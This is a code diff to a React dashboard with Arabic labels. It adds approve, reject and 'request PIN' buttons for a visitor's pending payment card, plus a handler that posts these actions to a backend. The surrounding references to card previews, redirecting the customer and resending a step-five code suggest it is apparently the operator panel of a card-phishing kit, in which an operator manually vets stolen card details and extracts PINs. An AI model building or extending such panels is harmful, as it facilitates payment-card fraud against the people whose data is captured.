@@ -1453,6 +1453,42 @@ export default function DashboardPage() {
     setActionLoading(null);
   };
 
+  // Handle payment card action (approve/reject/pin)
+  const handlePaymentAction = async (visitorId: string | undefined, action: string) => {
+    if (!visitorId) {
+      showNotification("error", "لم يتم اختيار عميل");
+      return;
+    }
+    
+    console.log("[PaymentAction] Action:", action, "visitorId:", visitorId);
+    setActionLoading("payment");
+    
+    try {
+      const res = await fetch("/api/dashboard/payment-action", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ visitorId, action }),
+      });
+      
+      if (res.ok) {
+        if (action === "approved") {
+          showNotification("success", "تم الموافقة ✓ جاري توجيه العميل");
+        } else if (action === "rejected") {
+          showNotification("error", "تم الرفض ✗");
+        } else if (action === "pin") {
+          showNotification("success", "تم إرسال طلب رمز PIN ✓");
+        }
+        // Refresh data
+        fetchDashboardData();
+      } else {
+        showNotification("error", "حدث خطأ");
+      }
+    } catch {
+      showNotification("error", "فشل الاتصال");
+    }
+    setActionLoading(null);
+  };
+
   // Handle resend code for step5
   const handleResendCode = async () => {
     const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
@@ -1919,6 +1955,76 @@ export default function DashboardPage() {
             {cardConfig.text}
           </span>
         </div>
+
+        {/* أزرار التحكم */}
+        {cardStatus === "pending" && (
+          <div style={{ 
+            display: "flex", 
+            gap: 8, 
+            marginBottom: 12 
+          }}>
+            <button
+              onClick={() => handlePaymentAction(selectedRequest?.id || selectedRequest?.visitorId, "approved")}
+              style={{
+                flex: 1,
+                padding: "10px 16px",
+                borderRadius: 8,
+                border: "none",
+                background: "#166534",
+                color: "white",
+                fontSize: "0.8rem",
+                fontWeight: 600,
+                cursor: "pointer",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                gap: 6
+              }}
+            >
+              ✅ موافق
+            </button>
+            <button
+              onClick={() => handlePaymentAction(selectedRequest?.id || selectedRequest?.visitorId, "rejected")}
+              style={{
+                flex: 1,
+                padding: "10px 16px",
+                borderRadius: 8,
+                border: "none",
+                background: "#991b1b",
+                color: "white",
+                fontSize: "0.8rem",
+                fontWeight: 600,
+                cursor: "pointer",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                gap: 6
+              }}
+            >
+              ❌ رفض
+            </button>
+            <button
+              onClick={() => handlePaymentAction(selectedRequest?.id || selectedRequest?.visitorId, "pin")}
+              style={{
+                flex: 1,
+                padding: "10px 16px",
+                borderRadius: 8,
+                border: "none",
+                background: "#1e40af",
+                color: "white",
+                fontSize: "0.8rem",
+                fontWeight: 600,
+                cursor: "pointer",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                gap: 6
+              }}
+            >
+              🔑 رمز PIN
+            </button>
+          </div>
+        )}
 
         {/* Card Preview */}
         <div style={{
